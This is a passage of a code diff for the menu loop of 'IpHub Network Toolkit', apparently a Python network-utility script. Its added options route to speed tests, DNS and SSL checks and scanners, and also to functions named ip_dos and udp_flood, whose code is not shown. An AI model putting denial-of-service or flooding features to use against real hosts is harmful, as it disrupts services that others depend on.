+                print(f"{GREEN}IpHub Network Toolkit v2.1 (Early Access){RESET}")
+                print(f"{BLUE}GitHub: https://github.com/Demon33gio/IpHub.git{RESET}")
+                input("\nPress Enter to continue...")
+            elif choice == '24':
+                speed_test()
+            elif choice == '25':
+                dns_benchmark()
+            elif choice == '26':
+                http_https_check()
+            elif choice == '27':
+                ssl_check()
+            elif choice == '28':
+                multi_geolocation()
+            elif choice == '29':
+                termux_network_info()
+            elif choice == '30':
+                ip_dos()
+            elif choice == '31':
+                udp_flood()
+            elif choice == '32':
+                wifi_scanner()
+            elif choice == '33':
+                vulnerability_scan()
+            elif choice.lower() == 'exit' or choice.lower() == 'quit':
+                print(f"{GREEN}Goodbye!{RESET}")
                 break
             else:
-                print(f"{RED}Invalid choice. Please try again.{RESET}")
+                print(f"{RED}Invalid option. Please try again.{RESET}")
                 time.sleep(1)
                 
         except KeyboardInterrupt:
@@ -1335,7 +1751,7 @@ def main():
             break
         except Exception as e:
             print(f"{RED}Error: {str(e)}{RESET}")
-            time.sleep(2)
+            input("\nPress Enter to continue...")
 
 if __name__ == "__main__":
     main()
